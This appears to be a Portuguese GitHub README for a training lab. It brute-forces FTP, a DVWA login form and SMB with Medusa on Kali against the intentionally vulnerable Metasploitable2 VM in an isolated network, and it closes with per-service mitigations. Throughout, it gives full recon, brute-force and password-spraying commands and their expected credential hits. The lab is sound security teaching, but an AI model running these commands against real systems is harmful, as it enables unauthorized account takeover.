# DIO | Lab Brute Force com Medusa — por riad

![Kali](https://img.shields.io/badge/Kali_Linux-557C94?style=flat&logo=kalilinux&logoColor=white)
![Medusa](https://img.shields.io/badge/Medusa-2.2+-red?style=flat)
![Metasploitable2](https://img.shields.io/badge/Metasploitable2-Lab-blue?style=flat)
![DVWA](https://img.shields.io/badge/DVWA-Web_Form-orange?style=flat)

> Desafio prático DIO: ataque de força bruta com **Medusa no Kali Linux** contra **Metasploitable2**, em 3 cenários — **FTP**, **DVWA Web-Form** e **SMB Password Spraying + enumeração**.

---

## ⚠️ Disclaimer Ético

> **Use apenas em ambiente controlado.**
>
> Todos os testes deste laboratório foram executados em rede isolada **host-only (VirtualBox)** contra a VM intencionalmente vulnerável **Metasploitable2**.
>
> - ❌ Não execute Medusa, Hydra, Nmap ou qualquer scanner contra alvos sem autorização formal por escrito.
> - ✅ Brute force em ambiente real sem consentimento é crime (Art. 154-A do Código Penal — invasão de dispositivo informático).
> - Este repositório tem finalidade **100% educacional e defensiva**: aprender a atacar para aprender a defender.

---

## 🎯 Objetivos de Aprendizagem

1. **Montar laboratório isolado** com Kali Linux (atacante) + Metasploitable2 (vítima) em rede host-only `vboxnet0`.
2. **Executar reconhecimento** com Nmap, Enum4linux e Smbclient para mapear FTP (21), HTTP/DVWA (80) e SMB (139/445).
3. **Realizar brute force FTP** com Medusa, validar credenciais e entender o impacto de senhas fracas/padrão.
4. **Explorar brute force Web-Form (DVWA)** configurando Security Level Low, inspecionando o formulário e usando o módulo `web-form` do Medusa.
5. **Executar enumeração + password spraying no SMB**, validar acesso via `smbclient` e propor mitigações (lockout, MFA, SMB signing, fail2ban, logs).

---

## 🗺️ Topologia do Lab

```text
                    vboxnet0 — 192.168.56.0/24 (Host-Only)
    ┌─────────────────────────┐                ┌─────────────────────────┐
    │  VM1 — Kali Linux       │◄──────────────►│  VM2 — Metasploitable2  │
    │  (atacante)             │   rede isolada │  (vítima)               │
    │  Medusa + Nmap +        │   sem internet │  FTP 21 / HTTP 80 /     │
    │  enum4linux + smbclient │                │  SMB 139,445 / DVWA     │
    └─────────────────────────┘                └─────────────────────────┘
```

| Máquina | Função | IP exemplo | Sistema |
|---------|--------|------------|---------|
| VM1 | Atacante | `192.168.56.10` | Kali Linux Rolling |
| VM2 | Vítima | `192.168.56.20` | Metasploitable2 Linux |
| Rede | Host-only | `192.168.56.0/24` | Adaptador `vboxnet0` |

> Os IPs podem variar por DHCP do host-only. Confirme com `ip a` no Kali e no console do Metasploitable2. Troque `192.168.56.20` pelo IP real da sua VM2 nos comandos abaixo.

---

## ✅ Pré-requisitos e Versões

| Item | Versão testada / recomendada |
|------|-------------------------------|
| VirtualBox | 7.0+ com Extension Pack |
| Kali Linux | 2024.x (VM ou ISO) |
| Metasploitable2 | `metasploitable-linux-2.0.0.zip` (Rapid7 / SourceForge) |
| Medusa | 2.2+ (`medusa -V` para conferir, já vem no Kali) |
| Nmap | 7.9x+ |
| Enum4linux / smbclient | `enum4linux`, `smbclient 4.x` (pacote `smbclient`) |
| DVWA | Embutido no Metasploitable2 (`/dvwa/`) |
| Host | 4 GB RAM livre (2 GB Kali + 1 GB Meta2), 30 GB disco |

Instalação / conferência no Kali:

```bash
sudo apt update && sudo apt install -y medusa nmap enum4linux smbclient
medusa -V
nmap --version
smbclient --version
```

Wordlists usadas (padrão Kali):

```bash
ls /usr/share/wordlists/
# SecLists (se instalado): /usr/share/wordlists/seclists/
# Rockyou: /usr/share/wordlists/rockyou.txt.gz
```

> Para o lab crie listas pequenas e controladas (`users.txt` e `passwords.txt`) — mais rápido e didático que rodar o `rockyou.txt` inteiro.

```bash
mkdir -p ~/lab-medusa && cd ~/lab-medusa
cat > users.txt <<'EOF'
admin
msfadmin
root
user
guest
test
EOF

cat > passwords.txt <<'EOF'
admin
password
123456
msfadmin
root
toor
guest
test
qwerty
letmein
EOF

cat users.txt
cat passwords.txt
```

---

## Passo 1 — Configuração VirtualBox Host-Only

1. **Criar rede host-only:**
   - VirtualBox → `Arquivo > Ferramentas > Gerenciador de Rede` (ou `Arquivo > Host Network Manager`).
   - Criar adaptador `vboxnet0` com:
     - IPv4: `192.168.56.1`
     - Máscara: `255.255.255.0`
     - DHCP: ativado (faixa `192.168.56.100–254`) — ou use IP estático nas VMs.

2. **VM1 Kali:**
   - Configurações → Rede → Adaptador 1 → `Somente-anfitrião (Host-only)` → `vboxnet0`.
   - No Kali:
     ```bash
     ip a
     # esperado: eth0 / enp0s3 com 192.168.56.x
     ping -c 3 192.168.56.1
     ```

3. **VM2 Metasploitable2:**
   - Mesmo adaptador host-only `vboxnet0`.
   - Login padrão console: `msfadmin / msfadmin`.
   - Descobrir IP:
     ```bash
     ifconfig | grep -A1 eth0
     # ou
     ip addr show
     ```
   - Teste de conectividade (do Kali):
     ```bash
     ping -c 4 192.168.56.20
     ```

> ✅ Critério de pronto: Kali pinga Meta2 e vice-versa, sem rota para internet nesse adaptador. Isolamento = segurança.

---

## Passo 2 — Reconhecimento

### 2.1 Nmap — portas e serviços

```bash
# Descoberta rápida de hosts na rede host-only
nmap -sn 192.168.56.0/24

# Scan completo de portas + versões no alvo (exemplo .20)
nmap -sV -sC -p- 192.168.56.20 -oN nmap-full.txt

# Foco nos serviços do desafio
nmap -sV -p 21,80,139,445 192.168.56.20
```

Resultado esperado (resumido):

```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

Salvar evidência:

```bash
cat nmap-full.txt
```

### 2.2 Enum4linux — enumeração SMB

```bash
enum4linux -a 192.168.56.20 | tee enum4linux.txt

# Variações úteis
enum4linux -U 192.168.56.20   # lista de usuários
enum4linux -S 192.168.56.20   # lista de shares
enum4linux -o 192.168.56.20   # informações de OS
```

O que procurar: nomes de usuários (`msfadmin`, `user`, `service`, `tomcat`), shares (`print$`, `tmp`, `opt`, `IPC$`), `Workgroup: WORKGROUP`, `OS: Unix - Samba`.

### 2.3 Smbclient — shares anônimos/guest

```bash
# Listar shares sem senha
smbclient -L //192.168.56.20 -N

# Tentar acesso guest
smbclient //192.168.56.20/tmp -N -c "ls"

# Checar null session
rpcclient -U "" -N 192.168.56.20 -c "enumdomusers"
```

> Anote usuários e shares válidos — eles viram o `users.txt` do spraying SMB.

---

## Passo 3a — Brute Force FTP com Medusa

**Alvo:** `vsftpd 2.3.4` na porta 21 — credencial padrão conhecida do Meta2: `msfadmin:msfadmin`.

Comando principal:

```bash
medusa -h 192.168.56.20 -U users.txt -P passwords.txt -M ftp -t 4 -f -O ftp-medusa.log
```

Parâmetros:

| Flag | Significado |
|------|-------------|
| `-h` | host alvo |
| `-U` | lista de usuários |
| `-P` | lista de senhas |
| `-M ftp` | módulo FTP |
| `-t 4` | 4 threads paralelas (rápido sem derrubar o serviço) |
| `-f` | para no primeiro login válido encontrado |
| `-O` | salva log |

Resultado esperado:

```text
ACCOUNT CHECK: [ftp] Host: 192.168.56.20 (1 of 1, 0 complete) User: msfadmin (2 of 6, 0 complete) Password: msfadmin (4 of 10, 0 complete)
ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

**Como validar (prova de acesso):**

```bash
ftp 192.168.56.20
# usuário: msfadmin
# senha: msfadmin

# ou não-interativo:
ftp -n 192.168.56.20 <<'EOF'
user msfadmin msfadmin
pwd
ls
quit
EOF
```

✅ Critério: login `230 Login successful.` + `ls` lista diretório. Print do terminal + `ftp-medusa.log` são as evidências.

---

## Passo 3b — DVWA Brute Force (Web-Form)

### B1. Preparar o DVWA

1. No Kali, acesse: `http://192.168.56.20/dvwa/`
2. Login inicial DVWA: `admin / password` → `Login`.
3. No menu lateral: **DVWA Security → Security Level: `Low` → Submit.**
4. Acesse: **Brute Force** (`http://192.168.56.20/dvwa/vulnerabilities/brute/`).
   - Deve aparecer o formulário com `Username`, `Password` e botão `Login`.

> Sem o nível `Low`, o DVWA ativa CSRF token / rate-limit e o módulo `web-form` simples falha — comportamento esperado para comparar depois nos níveis Medium/High.

### B2. Inspecionar o formulário

No navegador: `F12 > Inspetor` no formulário. Anote:

```html
<form action="#" method="GET">
  <p>Username: <input type="text" name="username"></p>
  <p>Password: <input type="password" name="password"></p>
  <p><input type="submit" value="Login" name="Login"></p>
</form>
```

- Método: `GET`
- Campos: `username`, `password`, `Login=Login`
- Resposta de falha contém: `Username and/or password incorrect.`
- URL do form: `/dvwa/vulnerabilities/brute/`

### B3. Ataque com Medusa (`-M web-form`)

Sintaxe do módulo:

```text
FORM:<caminho>:<usuário>=^USER^&<senha>=^PASS^&<submit>=<valor>:<DENY-SIGNAL>:<FORM-DATA opcional>
```

Comando:

```bash
medusa -h 192.168.56.20 \
  -U users.txt -P passwords.txt \
  -M web-form \
  -m FORM:'/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.' \
  -t 2 -f -O dvwa-medusa.log
```

Variação com cookie de sessão (se o DVWA exigir login antes):

```bash
# 1. Logue no DVWA no navegador, copie PHPSESSID e security=low via DevTools > Storage > Cookies
# 2. Use:
medusa -h 192.168.56.20 \
  -U users.txt -P passwords.txt \
  -M web-form \
  -m FORM:'/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:Cookie\: PHPSESSID=SESSID_AQUI; security=low' \
  -t 2 -f -O dvwa-medusa.log
```

Resultado esperado (`dvwa-medusa.log`):

```text
ACCOUNT CHECK: [web-form] Host: 192.168.56.20 User: admin Password: password [SUCCESS — resposta sem DENY-SIGNAL]
ACCOUNT FOUND: [web-form] Host: 192.168.56.20 User: admin Password: password [SUCCESS]
```

Credencial padrão do DVWA: **`admin:password`**.

**Validação manual:** logar no form com `admin / password` → mensagem `Welcome to the password protected area admin`.

> Dica de debug: se tudo falhar, rode com `-d` (debug) e confira `FORM`, `DENY-SIGNAL` e cookie:
> ```bash
> medusa -h 192.168.56.20 -u admin -p password -M web-form -m FORM:'/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.' -d
> ```

---

## Passo 3c — SMB: Enumeração + Password Spraying + Validação

O SMB trava/bloqueia fácil com muitas threads. A técnica correta é **spraying**: poucas senhas × muitos usuários, devagar.

### C1. Enumeração prévia (alvos para o spray)

```bash
# Usuários e shares (reaproveite o Passo 2)
enum4linux -a 192.168.56.20 | tee enum4linux.txt
smbclient -L //192.168.56.20 -N | tee smb-shares.txt

# Monte users.txt real a partir do enum (exemplo)
cat > smb-users.txt <<'EOF'
msfadmin
user
service
tomcat
sys
klog
postgres
EOF
cat smb-users.txt
```

### C2. Spraying com senha única (`-p`)

Testa **1 senha provável contra todos os usuários** — baixo ruído, ideal primeiro:

```bash
medusa -h 192.168.56.20 -U smb-users.txt -p msfadmin -M smbnt -t 1 -O smb-spray.log
```

Outros sprays clássicos (um por vez):

```bash
medusa -h 192.168.56.20 -U smb-users.txt -p password -M smbnt -t 1 -O smb-spray.log
medusa -h 192.168.56.20 -U smb-users.txt -p admin -M smbnt -t 1 -O smb-spray.log
```

### C3. Força total com lista (`-P`)

Só após o spray, com poucas threads:

```bash
medusa -h 192.168.56.20 -U smb-users.txt -P passwords.txt -M smbnt -t 1 -f -O smb-brute.log
```

Resultado esperado:

```text
ACCOUNT CHECK: [smbnt] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT FOUND: [smbnt] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

> Módulo pode aparecer como `smbnt`, `smb` ou `smb2` conforme a build do Medusa (`medusa -d | grep -i smb` lista os disponíveis). Use `smbnt` no Meta2 (Samba 3.x).

### C4. Validação com smbclient

```bash
# Listar shares autenticado
smbclient -L //192.168.56.20 -U msfadmin%msfadmin

# Conectar e listar arquivos
smbclient //192.168.56.20/tmp -U msfadmin%msfadmin -c "ls"

# Sessão interativa
smbclient //192.168.56.20/tmp -U msfadmin
# smb: \> ls
# smb: \> exit
```

✅ Critério: `NT_STATUS_LOGON_FAILURE` some; com credencial válida o `ls` retorna o conteúdo do share.

---

## Passo 4 — Tabela de Resultados

| # | Serviço | Alvo | Comando Medusa (resumo) | Credencial encontrada | Validação |
|---|---------|------|--------------------------|-----------------------|-----------|
| 3a | FTP (21) | `192.168.56.20` | `medusa -h IP -U users.txt -P passwords.txt -M ftp` | `msfadmin : msfadmin` | `ftp IP` → `230 Login successful` |
| 3b | DVWA Web-Form (80) | `/dvwa/vulnerabilities/brute/` | `medusa -M web-form -m FORM:'...:Username and/or password incorrect.'` | `admin : password` | Login no form → `Welcome ... admin` |
| 3c | SMB (445) | `//IP/tmp` | `medusa -M smbnt -U smb-users.txt -p msfadmin` → `-P passwords.txt` | `msfadmin : msfadmin` | `smbclient -L //IP -U msfadmin%msfadmin` |

Logs gerados:

```text
nmap-full.txt
enum4linux.txt
ftp-medusa.log
dvwa-medusa.log
smb-spray.log
smb-brute.log
```

---

## Passo 5 — Mitigações por Serviço

### Gerais (valem para tudo)

- **Senhas fortes + gerenciador:** mínimo 14 caracteres, únicas por serviço. Eliminar padrão `msfadmin/msfadmin` e `admin/password`.
- **MFA:** onde houver login interativo/web, exigir segundo fator.
- **Lockout + rate-limit:** bloquear após 5 falhas (com desbloqueio progressivo, não permanente para não virar DoS).
- **Fail2ban / WAF:** banir IP após N falhas em FTP/HTTP/SMB.
- **Logs + alerta:** centralizar auth logs (SIEM), alertar em spray (muitos users × 1 senha) e brute (1 user × muitas senhas).
- **Desabilitar contas anon/guest** e remover usuários de teste (`guest`, `test`, `tomcat` padrão).

### FTP

- Desabilitar `anonymous_enable=YES` no `vsftpd.conf`; forçar `local_enable` apenas para quem precisa.
- Preferir **SFTP (porta 22)** ou **FTPS**; FTP puro trafega credencial em claro.
- `fail2ban` jail `vsftpd` + `max_login_fails=3`.
- Atualizar vsftpd (2.3.4 do Meta2 tem backdoor famoso CVE-2011-2523 — em produção, versão atual).

### DVWA / Web-Form

- CSRF token por requisição + CAPTCHA após 3 falhas (é o que os níveis Medium/High do DVWA fazem).
- Mensagem de erro genérica: nunca distinguir “usuário inválido” de “senha inválida”.
- Rate-limit por IP + conta, delay progressivo, bloqueio temporário.
- Hash moderno no banco (bcrypt/argon2), HTTPS obrigatório, cabeçalhos de segurança.

### SMB

- **SMB signing obrigatório** + desabilitar SMBv1; exigir SMBv3 com criptografia.
- Desabilitar **null session / acesso anônimo** (`restrict anonymous = 2`, `map to guest = never`).
- Princípio do menor privilégio nos shares; auditar `tmp`, `opt`, `print$` abertos.
- Política de lockout do AD/Samba + monitoramento de `NT_STATUS_LOGON_FAILURE` em massa.
- Segmentar rede: SMB nunca exposto fora da LAN; firewall 139/445 restrito.

---

## 📁 Estrutura do Repo

```text
dio-riad-medusa-bruteforce-lab/
├── README.md
├── ENTREGA.md
├── wordlists/
│   ├── users.txt
│   ├── passwords.txt
│   └── smb-users.txt
├── commands/
│   ├── recon-nmap.sh
│   ├── ftp-medusa.sh
│   ├── dvwa-medusa.sh
│   ├── smb-medusa.sh
│   └── MITIGACOES.md
├── logs/
└── images/
```

---

## 🖼️ Pasta `/images/` — Prints Sugeridos

Salve os prints em `images/` com estes nomes:

| Arquivo | Conteúdo |
|---------|----------|
| `01-vbox-hostonly.png` | Config do adaptador host-only `vboxnet0` no VirtualBox |
| `02-ping-kali-meta.png` | `ping` Kali → Meta2 funcionando |
| `03-nmap-scan.png` | `nmap -sV -p 21,80,139,445` com serviços abertos |
| `04-enum4linux.png` | Trecho do `enum4linux -a` com usuários/shares |
| `05-medusa-ftp.png` | `ACCOUNT FOUND: [ftp] ... msfadmin:msfadmin` |
| `06-ftp-login.png` | Login `ftp` validado (`230 Login successful`) |
| `07-dvwa-security-low.png` | DVWA Security Level = Low |
| `08-dvwa-inspect-form.png` | DevTools mostrando `username/password/Login` |
| `09-medusa-webform.png` | `ACCOUNT FOUND: [web-form] ... admin:password` |
| `10-dvwa-welcome.png` | `Welcome to the password protected area` |
| `11-medusa-smb-spray.png` | Spray `-p msfadmin` com sucesso |
| `12-smbclient-ls.png` | `smbclient -L` / `ls` autenticado |

---

## 🔁 Como Reproduzir

```bash
# 1. Clonar
git clone <URL-DO-REPO> dio-riad-medusa-bruteforce-lab
cd dio-riad-medusa-bruteforce-lab

# 2. Subir VMs em host-only (Passo 1) e anotar IP do Meta2
export TARGET=192.168.56.20

# 3. Recon
nmap -sV -p 21,80,139,445 $TARGET -oN logs/nmap-full.txt
enum4linux -a $TARGET | tee logs/enum4linux.txt
smbclient -L //$TARGET -N

# 4a. FTP
medusa -h $TARGET -U users.txt -P passwords.txt -M ftp -t 4 -f -O logs/ftp-medusa.log

# 4b. DVWA (Security Low + FORM conforme Passo 3b)
medusa -h $TARGET -U users.txt -P passwords.txt -M web-form \
  -m FORM:'/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.' \
  -t 2 -f -O logs/dvwa-medusa.log

# 4c. SMB spraying + brute + validação
medusa -h $TARGET -U smb-users.txt -p msfadmin -M smbnt -t 1 -O logs/smb-spray.log
medusa -h $TARGET -U smb-users.txt -P passwords.txt -M smbnt -t 1 -f -O logs/smb-brute.log
smbclient -L //$TARGET -U msfadmin%msfadmin
```

---

## 📚 Referências

- Kali Linux — Documentação oficial: https://www.kali.org/docs/
- Medusa — Manual / opções de módulos: http://foofus.net/goons/jmk/medusa/medusa.html
- DVWA — Damn Vulnerable Web Application: https://github.com/digininja/DVWA
- Nmap — Reference Guide: https://nmap.org/book/man.html
- Samba `smbclient` — man page: https://www.samba.org/samba/docs/current/man-html/smbclient.1.html
- Rapid7 Metasploitable2: https://github.com/rapid7/metasploitable3 (guia) / imagem 2.0 no SourceForge

---

## 👤 Autor

**riad**

- GitHub: `https://github.com/SEU-USUARIO/riad` _(trocar pelo link real)_
- DIO: `https://www.dio.me/users/SEU-USUARIO` _(trocar pelo perfil real)_

Desafio: **Ataque Brute Force com Medusa e Kali Linux** — DIO.

Se este lab te ajudou, ⭐ favorite o repo e compartilhe seu `logs/` + `images/` como evidência no portfólio.
